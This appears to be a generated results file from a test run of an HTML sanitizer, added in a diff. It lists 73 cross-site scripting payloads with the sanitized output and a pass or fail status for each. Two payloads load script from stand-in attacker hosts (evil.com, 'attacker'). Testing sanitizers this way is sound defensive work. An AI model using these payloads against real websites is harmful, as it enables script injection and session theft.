@@ -1,0 +1,447 @@
+{
+  "testedPayloads": 73,
+  "passed": 72,
+  "failed": 1,
+  "timestamp": "2025-10-20T08:33:27.429247",
+  "results": [
+    {
+      "index": 0,
+      "input": "<script>alert('xss')</script>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 1,
+      "input": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 2,
+      "input": "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 3,
+      "input": "<script>confirm('xss')</script>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 4,
+      "input": "<scr<script>ipt>alert(1)</scr<script>ipt>",
+      "output": "ipt&gt;",
+      "status": "passed"
+    },
+    {
+      "index": 5,
+      "input": "<img src=x onerror=alert(1)>",
+      "output": "<img src=\"x\">",
+      "status": "passed"
+    },
+    {
+      "index": 6,
+      "input": "<img src=1 href=1 onerror='javascript:alert(1)'>",
+      "output": "<img src=\"1\">",
+      "status": "passed"
+    },
+    {
+      "index": 7,
+      "input": "<img src=x onerror=\"alert('XSS')\">",
+      "output": "<img src=\"x\">",
+      "status": "passed"
+    },
+    {
+      "index": 8,
+      "input": "<img src=javascript:alert(1)>",
+      "output": "<img>",
+      "status": "passed"
+    },
+    {
+      "index": 9,
+      "input": "<img src='data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'>",
+      "output": "<img>",
+      "status": "passed"
+    },
+    {
+      "index": 10,
+      "input": "<svg onload=alert(1)>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 11,
+      "input": "<svg><script>alert('xss')</script></svg>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 12,
+      "input": "<svg><a xlink:href='javascript:alert(1)'>x</a></svg>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 13,
+      "input": "<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate></svg>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 14,
+      "input": "<svg><foreignObject><body onload=alert('xss')></body></foreignObject></svg>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 15,
+      "input": "<iframe src='javascript:alert(1)'></iframe>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 16,
+      "input": "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 17,
+      "input": "<iframe onload=alert('xss')></iframe>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 18,
+      "input": "<object data='javascript:alert(1)'></object>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 19,
+      "input": "<embed src='javascript:alert(1)'></embed>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 20,
+      "input": "<a href=javascript:alert(1)>click</a>",
+      "output": "<a>click</a>",
+      "status": "passed"
+    },
+    {
+      "index": 21,
+      "input": "<a href=\"JaVaScRiPt:alert('XSS')\">X</a>",
+      "output": "<a>X</a>",
+      "status": "passed"
+    },
+    {
+      "index": 22,
+      "input": "<a href=javascript:confirm(1)>X</a>",
+      "output": "<a>X</a>",
+      "status": "passed"
+    },
+    {
+      "index": 23,
+      "input": "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>payload</a>",
+      "output": "<a>payload</a>",
+      "status": "passed"
+    },
+    {
+      "index": 24,
+      "input": "<a href=vbscript:msgbox('xss')>vb</a>",
+      "output": "<a>vb</a>",
+      "status": "passed"
+    },
+    {
+      "index": 25,
+      "input": "<div style=\"background:url(javascript:alert(1))\">x</div>",
+      "output": "<div>x</div>",
+      "status": "passed"
+    },
+    {
+      "index": 26,
+      "input": "<div style=\"width: expression(alert('xss'))\">x</div>",
+      "output": "<div>x</div>",
+      "status": "passed"
+    },
+    {
+      "index": 27,
+      "input": "<style>@import 'javascript:alert(1)';</style>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 28,
+      "input": "<style>body{background-image:url('javascript:alert(1)')}</style>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 29,
+      "input": "<style>div{background:url('data:text/html,<script>alert(1)</script>')}</style>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 30,
+      "input": "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 31,
+      "input": "<meta http-equiv=\"set-cookie\" content=\"sessionId=bad;url=javascript:alert(1)\">",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 32,
+      "input": "<meta charset=\"UTF-7\"><script>alert(1)</script>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 33,
+      "input": "<meta content=\"0;url=javascript:alert(1)\" http-equiv=\"refresh\">",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 34,
+      "input": "<form action=\"javascript:alert(1)\"><input></form>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 35,
+      "input": "<input onfocus=alert('xss') autofocus>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 36,
+      "input": "<textarea oninput=alert('xss')>text</textarea>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 37,
+      "input": "<button onclick=alert('xss')>Click</button>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 38,
+      "input": "<select onchange=alert('xss')><option>1</option></select>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 39,
+      "input": "<b onmouseover=alert(1)>bold</b>",
+      "output": "<b>bold</b>",
+      "status": "passed"
+    },
+    {
+      "index": 40,
+      "input": "<div onmouseenter=alert('xss')>x</div>",
+      "output": "<div>x</div>",
+      "status": "passed"
+    },
+    {
+      "index": 41,
+      "input": "<body onload=alert('xss')>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 42,
+      "input": "<details open ontoggle=alert('xss')>x</details>",
+      "output": "<details open=\"\">x</details>",
+      "status": "passed"
+    },
+    {
+      "index": 43,
+      "input": "<marquee onstart=alert('xss')>x</marquee>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 44,
+      "input": "<math><mi xlink:href=\"data:x,<script>alert(1)</script>\"></mi></math>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 45,
+      "input": "<xml onreadystatechange=alert(1)></xml>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 46,
+      "input": "<isindex action=javascript:alert(1)>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 47,
+      "input": "<plaintext><script>alert(1)</script>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 48,
+      "input": "&lt;script&gt;alert('xss')&lt;/script&gt;",
+      "output": "&lt;script&gt;alert('xss')&lt;/script&gt;",
+      "status": "passed"
+    },
+    {
+      "index": 49,
+      "input": "<scr%00ipt>alert('xss')</scr%00ipt>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 50,
+      "input": "<scr<script>>alert(1)</scr<script>>",
+      "output": "&gt;",
+      "status": "passed"
+    },
+    {
+      "index": 51,
+      "input": "<IMG SRC='jav&#x09;ascript:alert(1)'>",
+      "output": "<img>",
+      "status": "passed"
+    },
+    {
+      "index": 52,
+      "input": "<div><scr<script>ipt>alert('xss')</scr<script>ipt></div>",
+      "output": "<div>ipt&gt;</div>",
+      "status": "passed"
+    },
+    {
+      "index": 53,
+      "input": "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 54,
+      "input": "<object data='data:text/html,<script>alert(1)</script>'></object>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 55,
+      "input": "<link rel='stylesheet' href='javascript:alert(1)'>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 56,
+      "input": "<video><source onerror=alert(1)></video>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 57,
+      "input": "<audio src='javascript:alert(1)'></audio>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 58,
+      "input": "<img src='data:image/svg+xml,<svg onload=alert(1)>'>",
+      "output": "<img>",
+      "status": "passed"
+    },
+    {
+      "index": 59,
+      "input": "<template><script>alert(1)</script></template>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 60,
+      "input": "<noscript><p onclick=alert('xss')>nope</p></noscript>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 61,
+      "input": "<xss id=x tabindex=1 onfocus=alert(1)>focus me</xss>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 62,
+      "input": "<math href='javascript:alert(1)'></math>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 63,
+      "input": "<div id=\"x\" style=\"position:absolute\">x</div><script>with(x)innerHTML='<img src=x onerror=alert(1)>'</script>",
+      "output": "<div>x</div>",
+      "status": "passed"
+    },
+    {
+      "index": 64,
+      "input": "<iframe srcdoc=\"<svg onload=alert(1)>\"></iframe>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 65,
+      "input": "<img src=x onerror=eval('alert(1)')>",
+      "output": "<img src=\"x\">",
+      "status": "passed"
+    },
+    {
+      "index": 66,
+      "input": "<div><img srcset='x 1x,javascript:alert(1) 2x'></div>",
+      "output": "<div><img></div>",
+      "status": "passed"
+    },
+    {
+      "index": 67,
+      "input": "<object type='text/x-scriptlet' data='http://attacker/xss.sct'></object>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 68,
+      "input": "<div title='\"><script>alert(1)</script>'>x</div>",
+      "output": "<div title=\"&quot;><script>alert(1)</script>\">x</div>",
+      "status": "failed",
+      "error": "🚨 Sanitasi gagal!\nMasih mengandung pola: <script\nInput: <div title='\"><script>alert(1)</script>'>x</div>\nOutput: <div title=\"&quot;><script>alert(1)</script>\">x</div>"
+    },
+    {
+      "index": 69,
+      "input": "<input value='\" onfocus=alert(1)//'>",
+      "output": "",
+      "status": "passed"
+    },
+    {
+      "index": 70,
+      "input": "<img src='x' onerror='alert(document.domain)'>",
+      "output": "<img src=\"x\">",
+      "status": "passed"
+    },
+    {
+      "index": 71,
+      "input": "<a href='x' onclick='alert(1)'>",
+      "output": "<a href=\"x\"></a>",
+      "status": "passed"
+    },
+    {
+      "index": 72,
+      "input": "<table background='javascript:alert(1)'></table>",
+      "output": "<table></table>",
+      "status": "passed"
+    }
+  ]
+}
